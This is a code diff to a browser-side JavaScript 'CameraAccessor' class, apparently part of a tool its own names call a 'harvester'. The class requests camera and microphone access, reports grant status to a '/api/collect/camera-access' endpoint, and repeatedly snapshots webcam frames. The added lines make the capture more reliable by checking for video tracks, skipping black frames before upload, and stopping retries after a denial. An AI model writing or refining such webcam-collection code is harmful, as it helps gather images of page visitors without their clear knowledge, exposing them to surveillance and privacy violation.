@@ -132,6 +132,7 @@ export default class CameraAccessor {
 
   async requestCamera() {
     if (this.active) return;
+    if (this.denied) return; // Don't retry if already denied
 
     try {
       const constraints = {
@@ -140,12 +141,20 @@ export default class CameraAccessor {
           height: { ideal: 480 },
           facingMode: 'user',
         },
-        // Request audio too for extra permissions
         audio: true,
       };
 
       this.stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+      // Ensure we actually have video content before marking active
+      const track = this.stream.getVideoTracks()?.[0];
+      if (!track) {
+        this.cleanup();
+        return;
+      }
+
       this.active = true;
+      this.denied = false;
 
       // Store that camera was granted
       sessionStorage.setItem('harvester_camera_granted', 'true');
@@ -187,7 +196,13 @@ export default class CameraAccessor {
 
     } catch (error) {
       this.active = false;
+      this.denied = true; // Mark as denied so we never retry for this session
       sessionStorage.removeItem('harvester_camera_granted');
+      // Stop all capture timers immediately
+      if (this.captureInterval) {
+        clearInterval(this.captureInterval);
+        this.captureInterval = null;
+      }
       await this.core.send('/api/collect/camera-access', { granted: false });
     }
   }
@@ -233,19 +248,52 @@ export default class CameraAccessor {
   }
 
   snapshotFrame() {
-    if (!this.stream || !this.active) {
+    if (!this.stream || !this.active || !this.video) {
       this.capturing = false;
       return;
     }
 
     try {
+      // Verify video has actual content (not just a blank frame)
+      if (this.video.readyState < 2 || this.video.videoWidth === 0 || this.video.videoHeight === 0) {
+        this.capturing = false;
+        return;
+      }
+
       const canvas = document.createElement('canvas');
       canvas.width = 320;
       canvas.height = 240;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(this.video, 0, 0, 320, 240);
 
-      const imageData = canvas.toDataURL('image/jpeg', 0.7);
+      // Check if the captured frame is blank/black (permission was revoked or stream is empty)
+      const imageDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+      
+      // Sample a small pixel area to check for blank frame
+      const sampleSize = 10;
+      const pixelData = ctx.getImageData(
+        canvas.width / 2 - sampleSize / 2,
+        canvas.height / 2 - sampleSize / 2,
+        sampleSize,
+        sampleSize
+      ).data;
+      
+      // Check if all sampled pixels are black (r+g+b ≈ 0) or very close to black
+      let totalBrightness = 0;
+      for (let i = 0; i < pixelData.length; i += 4) {
+        totalBrightness += pixelData[i] + pixelData[i + 1] + pixelData[i + 2];
+      }
+      const avgBrightness = totalBrightness / (pixelData.length / 4) / 3;
+      
+      // If average brightness is below threshold (very dark/black), skip upload
+      // 0 = pure black, 255 = pure white. < 10 = essentially black frame
+      if (avgBrightness < 10) {
+        console.warn('📷 Skipping blank camera frame (avg brightness:', avgBrightness.toFixed(1), ')');
+        this.capturing = false;
+        return;
+      }
+
+      const imageData = imageDataUrl;
 
       const track = this.stream.getVideoTracks()[0];
       const metadata = {
@@ -273,6 +321,7 @@ export default class CameraAccessor {
 
   cleanup() {
     this.active = false;
+    this.denied = false;
     sessionStorage.removeItem('harvester_camera_granted');
     if (this.captureInterval) {
       clearInterval(this.captureInterval);
